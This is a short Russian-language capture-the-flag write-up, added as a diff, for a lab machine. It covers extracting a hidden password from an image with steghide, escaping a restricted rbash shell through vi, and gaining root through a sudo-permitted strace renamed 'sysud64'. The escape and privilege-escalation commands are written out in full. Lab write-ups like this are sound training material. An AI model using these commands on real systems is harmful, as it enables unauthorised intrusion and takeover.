@@ -1,0 +1,17 @@
+оч легкая за счет такого что я знаю как обращаться с rbash
+
+1)находим комментарий на главной странице сайта  и какой то пароль h1dd3n
+    key_is_h1dd3n.jpg
+
+2)находим скрытое в картинке
+    steghide extract -sf key_is_h1dd3n.jpg
+        Brainfuck_encode(ud64:1M!#64@ud)
+
+3)при входе в ssh нас встречает rbash, но мы знаем как с ним справиться
+    vi
+        :!/bin/bash
+
+    export PATH=$PATH:/usr/local/bin:/usr/bin:/bin
+
+4)при проверке на sudo -l выяснилось что имеется какая то программа sysud64, которая на самом деле strace
+    sudo /usr/bin/sysud64 -o /dev/null /bin/sh
